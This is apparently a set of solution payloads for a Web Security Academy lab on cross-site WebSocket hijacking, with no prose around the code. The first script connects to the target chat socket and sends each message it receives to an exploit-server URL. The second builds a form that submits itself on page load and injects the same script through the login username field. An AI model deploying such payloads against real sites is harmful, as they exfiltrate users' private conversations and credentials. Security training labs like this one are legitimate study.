WEBSOCKET

<script>
const url = "wss://0ad8004b04f1105b80902bb500d3003d.web-security-academy.net/chat" 
const attackerServer = "https://exploit-0a3c00fd0310b6a9806a218c01bb0058.exploit-server.net/logs"

const newWebSocket = new WebSocket(url);

newWebSocket.onopen = function (evt) { 
	newWebSocket.send("READY");
} 

newWebSocket.onmessage = function (evt) {
	var message = evt.data;
	console.log(message);
	fetch(attackerServer+message);
}; 

newWebSocket.onclose = function (evt) { 
	webSocket = undefined; writeMessage("message", "System:", "--- Disconnected ---"); 
};
</script>


<script>
document.addEventListener("DOMContentLoaded", () => {

const url = "https://cms-0a1e00ff039eb691801b224100e40079.web-security-academy.net"

const script = `
const url = "wss://0a1e00ff039eb691801b224100e40079.web-security-academy.net/chat" 
const attackerServer = "https://exploit-0a3c00fd0310b6a9806a218c01bb0058.exploit-server.net/logs"

const newWebSocket = new WebSocket(url);

newWebSocket.onopen = function (evt) { 
	newWebSocket.send("READY");
} 

newWebSocket.onmessage = function (evt) {
	var message = evt.data;
	fetch(attackerServer+message);
}; 
`

const form = document.createElement("form");
form.method = "POST";
form.action = `${url}/login`;

const input = document.createElement("input");
input.type = "text";
input.name = "username";
input.value = script ;
form.appendChild(input);

const input2 = document.createElement("input");
input2 .type = "text";
input2 .name = "password";
input2 .value = "Test";
form.appendChild(input2);

document.body.appendChild(form);
form.submit();
});
</script>